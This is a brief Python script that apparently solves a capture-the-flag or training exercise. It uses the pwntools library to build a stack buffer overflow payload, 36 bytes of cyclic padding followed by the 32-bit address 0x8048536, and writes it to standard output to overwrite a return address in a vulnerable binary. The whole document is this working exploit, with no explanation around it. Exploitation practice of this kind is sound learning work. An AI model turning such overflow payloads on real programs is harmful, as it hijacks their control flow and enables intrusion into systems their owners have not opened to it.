#!/usr/bin/env python3

from pwn import *

payload = cyclic(36)
payload += p32(0x8048536)

sys.stdout.buffer.write(payload)